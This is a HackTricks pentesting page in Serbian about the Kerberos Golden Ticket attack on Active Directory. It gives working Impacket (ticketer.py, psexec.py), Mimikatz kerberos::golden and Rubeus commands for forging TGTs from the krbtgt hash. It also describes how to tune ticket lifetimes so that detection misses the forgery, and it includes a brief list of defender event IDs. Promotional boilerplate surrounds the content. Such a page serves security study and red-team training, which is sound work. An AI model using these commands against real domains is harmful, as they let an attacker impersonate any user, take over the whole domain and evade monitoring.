# Golden Ticket

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Zlatna karta

Napad **Zlatna karta** se sastoji od **kreiranja legitimnog Ticket Granting Ticket (TGT) koji se predstavlja kao bilo koji korisnik** kroz upotrebu **NTLM heša Active Directory (AD) krbtgt naloga**. Ova tehnika je posebno korisna jer omogućava **pristup bilo kojoj usluzi ili mašini** unutar domena kao predstavljeni korisnik. Važno je zapamtiti da **kredencijale krbtgt naloga nikada automatski ne ažuriraju**.

Da biste **dobili NTLM heš** krbtgt naloga, mogu se koristiti različite metode. Može se izvući iz **Local Security Authority Subsystem Service (LSASS) procesa** ili iz **NT Directory Services (NTDS.dit) fajla** koji se nalazi na bilo kom Domain Controller (DC) unutar domena. Takođe, **izvršavanje DCsync napada** je još jedna strategija za dobijanje ovog NTLM heša, što se može uraditi pomoću alata kao što su **lsadump::dcsync modul** u Mimikatz-u ili **secretsdump.py skripta** od Impacket-a. Važno je naglasiti da za izvođenje ovih operacija obično je potrebno **imati privilegije domenskog administratora ili sličan nivo pristupa**.

Iako NTLM heš služi kao prihvatljiva metoda u tu svrhu, **snažno se preporučuje** da se **lažiraju tiketi koristeći Advanced Encryption Standard (AES) Kerberos ključeve (AES128 i AES256)** iz razloga operativne sigurnosti.

{% code title="Sa Linux-a" %}
```
```
{% endcode %}

```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

{% code title="Sa Windowsa" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**Jednom** kada imate **ubrizgan golden ticket**, možete pristupiti zajedničkim datotekama **(C$)** i izvršavati usluge i WMI, tako da možete koristiti **psexec** ili **wmiexec** da biste dobili shell (izgleda da ne možete dobiti shell putem winrm).

### Bypassiranje uobičajenih detekcija

Najčešći načini za otkrivanje golden ticketa su **inspekcija Kerberos saobraćaja** na mreži. Podrazumevano, Mimikatz **potpisuje TGT na 10 godina**, što će se istaknuti kao anomalija u kasnijim TGS zahtevima koji se s njim prave.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Koristite parametre `/startoffset`, `/endin` i `/renewmax` da biste kontrolisali početni offset, trajanje i maksimalne obnove (sve u minutama).

```
Get-DomainPolicy | select -expand KerberosPolicy
```

Nažalost, vreme trajanja TGT-a nije zabeleženo u 4769, pa ove informacije nećete pronaći u Windows evidencijama događaja. Međutim, ono što možete povezati je **videti 4769 bez prethodnog 4768**. **Nije moguće zahtevati TGS bez TGT-a**, i ako nema zapisa o izdatom TGT-u, možemo zaključiti da je on lažiran offline.

Da biste **zaobišli ovu detekciju**, proverite dijamantske tikete:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Otklanjanje

* 4624: Prijavljivanje na nalog
* 4672: Prijavljivanje administratora
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Još neki trikovi koje branioci mogu primeniti su **upozorenje na 4769 za osetljive korisnike**, kao što je podrazumevani administratorski nalog domena.

## Reference

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* \[https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **oglašavanje vaše kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
